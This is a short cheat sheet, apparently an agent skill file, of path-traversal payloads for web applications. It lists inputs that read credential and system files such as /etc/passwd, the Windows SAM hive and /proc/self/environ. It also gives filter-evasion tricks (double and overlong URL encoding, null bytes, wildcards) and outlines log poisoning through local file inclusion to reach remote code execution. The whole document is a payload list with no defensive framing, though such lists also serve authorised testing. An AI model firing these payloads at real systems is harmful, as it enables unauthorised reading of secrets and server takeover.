---
name: path-traversal
description: "Directory traversal: file read, null byte bypass, encoding tricks, log poisoning."
---

# Path Traversal

## Basic
- ../../etc/passwd
- ....//....//etc/passwd
- ..%2f..%2fetc/passwd

## Null Byte
- ../../etc/passwd%00.jpg
- ..%00/..%00/etc/passwd

## Encoding
- ..%252f..%252fetc/passwd (double URL)
- %2e%2e%2f%2e%2e%2fetc/passwd
- ..%c0%af..%c0%afetc/passwd (UTF-8 overlong)

## OS-Specific
- Windows: ..\..\..\windows\system32\config\sam
- macOS: ../../../../etc/master.passwd
- Linux: /proc/self/environ, /proc/self/fd/0

## Bypass Filters
- Double encoding
- UTF-8 overlong encoding
- Null bytes
- Path truncation
- Wildcards: /???/??t /etc/passwd

## Log Poisoning
- Inject PHP/Perl code into logs
- Include logs via LFI -> RCE
